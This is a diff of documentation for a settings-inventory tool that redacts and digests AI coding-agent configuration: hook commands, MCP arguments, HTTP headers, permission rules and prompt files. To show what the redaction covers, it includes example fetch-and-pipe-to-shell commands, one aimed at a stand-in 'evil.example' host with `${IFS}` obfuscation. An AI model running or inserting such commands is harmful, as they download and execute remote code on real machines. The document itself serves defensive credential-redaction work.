@@ -399,14 +399,42 @@ and the keys of the Claude Code credential helpers `apiKeyHelper`, `awsAuthRefre
 `awsCredentialExport`, `gcpAuthRefresh` and `otelHeadersHelper`, wherever a settings file names one, but
 not their commands: each becomes `***` whatever it is, since a helper command such as
 `printf passphrase` can hold a credential the redaction does not recognise. No helper
-is run. A URL keeps only its scheme, host and
+is run. For the same reason a command, its arguments and the value of an HTTP header
+keep only their shape: the value of every key named `command`, ending in `Command`
+(such as Gemini CLI's `toolDiscoveryCommand`), `args` or `notify`, such as a hook
+command, a `statusLine` command or an MCP server's arguments, keeps the URL origins it
+names, the unquoted shell operators and the program word of each command, and no other
+word, so `check.sh --password 482913` is digested as `check.sh`. A program word is the
+first word of the value or the first after an unquoted `;`, `&`, `|`, line break, `(`,
+`$(` or opening backtick, after any `NAME=value` assignments and file descriptor
+numbers, and is kept only when it expands nothing but a variable name, as in
+`"$CLAUDE_PROJECT_DIR"/hooks/check.sh`. A wrapper such as `sudo`, `env` or `xargs` is
+the program word, and the words it runs are not kept. No word starts a command inside
+quotes, a comment, a redirection target, arithmetic, an array assignment or a
+`[[ ... ]]` test, or after a backslash before a line break, so
+`mysql -uroot \` followed by `-p482913 app_db` on the next line is digested as `mysql`.
+After `case`, whose patterns follow command separators, no word is kept, and a here
+document or here-string operator (`<<`, `<<-` or `<<<`) and everything after it become
+the operator and `***`, so `sudo -S apt-get update <<EOF`, a line `482913` and `EOF`
+are digested as `sudo<<***`. An argument list keeps only URL origins, and each value under
+`headers`, `httpHeaders`, `http_headers` or `env_http_headers`, such as `X-Pin: 482913`,
+in a map or in a list, becomes `***` while its header name stays. A `headersHelper`
+counts as a command. A permission rule in a Claude Code or Cursor `permissions.allow`,
+`ask` or `deny` list, or a Gemini CLI `excludeTools`, `coreTools`, `allowedTools` or
+`tools.exclude`, `tools.core` or `tools.allowed` list, and a hook `matcher` keep their
+tool name and the shape of their specifier, so `Bash(mysql -uroot -p482913 db:*)` is
+digested as `Bash(mysql)` and `Read(./src/**)` stays as it is. A Codex
+`shell_environment_policy.set` map and a `query_params` map keep their names only, as
+`env` does, and a Codex `experimental_bearer_token` or an OAuth `clientSecret` becomes
+`***`. A URL keeps only its scheme, host and
 port, and a credential in an assignment, after an authorization scheme or in a known
 token format is removed. The redaction is applied separately to the text between
 the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
 which are kept, so a URL or an assigned value ends at the first of them: a command,
 an operator or a host written after one without white space, such as
 `https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
-covered. Each URL scheme in such a text also starts a new part, so every URL keeps
+covered. In a command, an operator inside quotes, and `$`, `{` and `}` other than in
+`$(`, do not split the text, and a URL there keeps only its origin. Each URL scheme in such a text also starts a new part, so every URL keeps
 its own host whatever separates it from the text before it, such as the second host
 in `--webhooks=https://hooks.example/n,https://evil.example/x` or the host assigned to
 a credential-named option such as `--token-url=https://auth.example/t`;
@@ -431,14 +459,23 @@ credential helper command. The cost is that
 without the key a change to such a value alone, such as a new helper command, or a
 new token or URL path on the same host in a `notify` command such as
 `TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
-then carries a low `completeness` finding that names the key. Reordered keys and
+then carries a low `completeness` finding that names the key, and `diff` raises a
+medium alert that its values are unbound on every comparison, changed or not, so a
+keyless `diff --fail-on-alert` fails. Reordered keys and
 whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
 under the key over every file as read
 (profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
 any value while no unkeyed digest covers environment values or text the redaction
-removes. A value the redaction leaves in place, such as a password pasted into a hook
-command or stored under a key name, can still be confirmed from the digest, so keep
-credentials out of settings files. The digests agree between a keyed and an unkeyed
+removes. A value the redaction leaves in place outside a command, an argument list,
+a header, a permission rule or the maps and keys named above, such as a password
+stored under another key name or a `cwd` path, can still be confirmed from the
+digest, so keep credentials out of settings files. Without the key, a change only to a
+command's arguments, such as a new pinned version in an MCP server's `args`, a new
+option of a hook or `Bash(npm test)` becoming `Bash(npm publish)`, alters no digest, so
+`diff` cannot name it; the record instead raises the medium unbound-values alert on
+every comparison, so a keyless `--fail-on-alert` fails. A new program, host, operator,
+hook, rule, tool or header name still changes a recorded digest, so
+`diff` reports the change. The digests agree between a keyed and an unkeyed
 collection, except that without the key a file holding an ambiguous URL authority is
 a failure instead of a digest, so enabling the key later changes no recorded digest;
 the binding itself appears only with the key. A record from an earlier build has no
@@ -469,6 +506,23 @@ the record carries a low `completeness` finding that names it. An import is a ga
 is not read when the path imported, or the file a symlink there leads to, is
 [named as holding credentials](#files-named-as-holding-credentials).
 
+Every other instruction, rule, prompt or subagent file the `prompt` collector records
+follows the same rule, under the same profile, with its own path in the binding: an instruction, nested memory, rule, prompt
+or subagent file keeps `content_hash` only when its name has a Markdown suffix, is an
+instruction file name without one (`.cursorrules`, `.clinerules`, `.windsurfrules`,
+`system_prompt.txt`), or, in a rule, prompt or subagent directory, has no suffix at
+all, and when the file a symlink there leads to, if any, has a Markdown suffix, the
+same test an import of that file passes. `AGENTS.md` linked to `config/app.json` or
+`config/.windsurfrules` is recorded as `prompt:AGENTS.md` without `content_hash`, as is
+`.cursor/rules/x.json`; an ordinary
+`CLAUDE.md`, `AGENTS.md` linked to `docs/agents.md` and `.cursor/rules/x.mdc` keep it,
+and so does a rule file without a suffix that a directory symlink leads the walk to,
+such as `shared/r/style` behind `.cursor/rules` linked to `shared/r`, whose record
+names the directory in `properties.instruction_directory`. The files of a skill or
+command directory are skill resources: each keeps its unkeyed `sha256` digest whatever
+its name, also when it is a symlink to a file an import inventories without
+`content_hash`, so keep configuration out of skill directories.
+
 `validate --project` with the key recomputes the binding from the file and counts it
 as a verified hash, and a changed file as a failed one. A binding under another
 profile or key cannot be checked and is unknown evidence. Without the key, or for an
@@ -493,6 +547,12 @@ between that check and the read, so that the read follows it to such a file, is 
 collection failure, and nothing read is kept. A symlink to any other in-root file, such
 as `CLAUDE.md` to `AGENTS.md`, is read through its target.
 
+The `model` collector applies the same rule to a model directory's configuration,
+tokenizer and chat template files: one whose name, or the name of the in-root file a
+symlink there leads to, says it holds credentials, such as `config.json` linked to
+`../.env`, is a coverage gap that names it, and no `config_files`, `tokenizer_files`
+or chat template digest covers it.
+
 ## Upgrade existing snapshots
 
 Older static MCP snapshots lack the source binding and configured tool locators,
@@ -500,7 +560,15 @@ and older A2A snapshots lack the structure digests or carry the superseded
 `nexus-symbiote/a2a-card-structure/v1`, `v2` or `v3` profile; older RAG records carry no
 structure digest or the superseded `nexus-symbiote/rag-source-structure/v1` profile,
 and older IDE agent records no keyed settings binding and no
-`settings_hashes_profile`. They cannot establish this
+`settings_hashes_profile`. Prompt records from earlier builds carry a
+`content_hash` for files this build inventories without one: an `@path` import of a
+file without a Markdown suffix, such as `@prompts/system.txt`, a recorded instruction
+file that is a symlink to such a file, and a rule, prompt or subagent file whose name
+has a suffix other than a Markdown one, such as `.clinerules/style.txt`. Against such a
+baseline, `diff --fail-on-alert` raises a one-time high `Content hash removed` alert on
+each of them, and `validate --project` reports `project-reconciliation-failed`, with or
+without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`; without the key, each of them also raises
+the medium alert for unbound values on every comparison. They cannot establish this
 stronger reconciliation contract. Missing or unknown binding profiles fail
 validation and require recollection; copying a newly calculated digest into an
 old approved snapshot is not a migration.
